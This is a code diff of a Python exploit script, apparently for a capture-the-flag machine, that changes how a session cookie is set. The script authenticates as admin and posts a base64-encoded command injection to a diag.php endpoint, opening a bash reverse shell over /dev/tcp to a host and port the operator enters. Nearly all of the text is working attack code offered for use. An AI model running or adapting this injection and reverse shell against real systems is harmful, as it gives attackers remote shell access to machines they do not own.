@@ -6,12 +6,13 @@ args = parser.parse_args()
 
 USERNAME='admin'
 PASSWORD=''	# Removed because box is still active
+cookie='authBy0xMurphy'
 
 def payload(t):
 	return base64.b64encode(('; '+t).encode()).decode()
 
 def authenticate():
-	r = requests.post('http://'+args.rhost+'/', data={'username':USERNAME,'password':PASSWORD},cookies={'PHPSESSID':args.cookie})
+	r = requests.post('http://'+args.rhost+'/', data={'username':USERNAME,'password':PASSWORD},cookies={'PHPSESSID':cookie})
 	if 'Dashboard' in r.text:
 		print('Logged in as admin...')
 	else:
@@ -19,15 +20,13 @@ def authenticate():
 		authenticate()
 
 def exploit():
-	if not args.cookie:
-		args.cookie='authBy0xMurphy'
 	ip = input('Remote Host: ')
 	port = input('Remote Port: ')
-	r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=ip,port=port))},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+	r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=ip,port=port))},cookies={'PHPSESSID':cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
 	if '<title>Login</title>' in r.text:
 		print('Authentication failed. Reauthenticating...')
 		authenticate()
-		r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=ip,port=port))},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
+		r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=ip,port=port))},cookies={'PHPSESSID':cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
 
 if __name__ == '__main__':
 	checkVersion()
